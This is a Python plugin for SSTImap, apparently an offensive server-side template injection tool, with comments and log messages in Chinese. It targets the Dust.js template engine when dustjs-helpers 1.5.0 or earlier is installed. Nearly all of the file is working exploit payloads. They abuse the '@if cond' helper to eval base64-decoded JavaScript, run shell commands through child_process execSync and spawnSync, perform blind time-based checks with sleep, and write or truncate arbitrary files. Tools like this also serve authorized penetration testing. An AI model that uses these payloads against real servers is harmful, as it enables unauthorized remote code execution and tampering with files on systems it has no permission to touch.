from utils.loggers import log
from plugins.languages import javascript
from utils import rand
from core import bash


class Dust(javascript.Javascript):
    legacy_plugin = True
    header_type = "cat"
    priority = 7
    plugin_info = {
        "Description": 'Dust.js 模板引擎',
        "Usage notes": '仅当安装了<=1.5.0版本的dustjs-helpers时才可能被利用。',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Github: https://github.com/linkedin/dustjs",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """{header[0]}{{!123!}}{header[1]}""",
                'trailer': """{trailer[0]}{{!123!}}{trailer[1]}""",
                'test_render': f'{rand.randstrings[0]}{{!qwe!}}{{#x a="{rand.randstrings[2]}" b="{rand.randstrings[1]}"}}{{:else}}{{b}}{{a}}{{/x}}',
                'test_render_expected': f'{rand.randstrings[0]}{rand.randstrings[1]}{rand.randstrings[2]}'
            },
            'render_error': {
                # 默认情况下会捕获错误，但由用户决定如何处理它们
                'call': 'inject',
                'render': """{code}""",
                'header': """{{@if cond="''['x']['{header[0]}'+'{header[1]}'+(""",
                'trailer': """).toString()+'{trailer[0]}'+'{trailer[1]}']"}}{{/if}}""",
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{@if cond="context.global.sstimap=eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}{{sstimap}}"""
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """0{{@if cond="[''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']"}}{{/if}}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())&&require('child_process').execSync('sleep {delay}')"}}{{/if}}"""
            },
            'execute': {
                'call': 'evaluate',
                'exfiltrate': 'base64',
                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'call': 'evaluate_blind',
                # execSync() 已在 Node 0.11 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'write': {
                'call': 'evaluate',
                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """require('fs').writeFileSync('{path}', '')"""
            },
        })

        self.set_contexts([
                # 文本上下文，没有闭包。这还包括 {%s}，例如{{payload}} 似乎有效。
                {'level': 0},
                # 阻止为 {#key}{/key} 和类似的需要绕过标签键名称。
                # 评论区
                {'level': 1, 'prefix': '!}}]', 'suffix': '{!'},
            ])

    def rendered_detected(self):
        # 仅对真实渲染有意义，因为其他技术隐式检查助手
        if not self.get('error', False):
            # 进一步的利用需要 if helper，它有
            # 在版本dustjs-helpers@1.5.0 中已弃用。
            # 检查这里是否有助手存在。
            rand_A = rand.randstr_n(2)
            rand_B = rand.randstr_n(2)
            rand_C = rand.randstr_n(2)
            expected = rand_A + rand_B + rand_C
            if expected in self.inject(f'{rand_A}{{@if cond="1"}}{rand_B}{{/if}}{rand_C}'):
                log.log(21, f"{self.plugin} 插件已确认dustjs \'if\' helper <= 1.5.0 的存在")
            else:
                log.log(22, f"{self.plugin} 插件未找到“if”帮助器 <= 1.5.0，无法进行评估。")
        super().rendered_detected()
